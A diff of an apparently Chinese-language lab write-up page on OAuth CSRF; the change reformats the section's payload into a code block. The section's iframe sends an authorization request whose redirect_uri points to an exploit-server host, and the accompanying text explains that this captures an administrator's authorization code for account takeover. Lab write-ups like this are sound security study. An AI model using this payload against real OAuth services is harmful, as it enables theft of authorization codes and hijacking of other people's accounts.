@@ -5142,10 +5142,8 @@ fclose($myfile);
 <!-- 这是一张图片，ocr 内容为： -->
 <p><img src="/images/081-1.png"></p>
 <h2 id="4、CSRF缺陷redirect-uri劫持code"><a href="#4、CSRF缺陷redirect-uri劫持code" class="headerlink" title="4、CSRF缺陷redirect_uri劫持code"></a><font style="color:#DF2A3F;">4、CSRF缺陷redirect_uri劫持code</font></h2><p>这个就是改redirect_url的值，改为攻击网站，攻击网站写</p>
-<p>:::info</p>
-<iframe src="[https://oauth-0a7400cb04161e5e80c1152902690027.oauth-server.net/auth?client_id=hsvii9krryl5joffjyca7&redirect_uri=https://exploit-0a2f0030045c1e37802816fc01070056.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>](https://oauth-0a7400cb04161e5e80c1152902690027.oauth-server.net/auth?client_id=hsvii9krryl5joffjyca7&redirect_uri=https://exploit-0a2f0030045c1e37802816fc01070056.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>)
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://oauth-0a7400cb04161e5e80c1152902690027.oauth-server.net/auth?client_id=hsvii9krryl5joffjyca7&amp;redirect_uri=https://exploit-0a2f0030045c1e37802816fc01070056.exploit-server.net/oauth-callback&amp;response_type=code&amp;scope=openid%20profile%20email&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
 
-<p>:::</p>
 <p>就是让管理员一访问网站，就向授权服务器发送授权请求，然后返回的code就会被发到回调地址，回调地址填的是我们的服务器，自然就获取到code，然后带上code直接访问就是管理员账号</p>
 <!-- 这是一张图片，ocr 内容为： -->
 <p><img src="/images/081-2.png"></p>
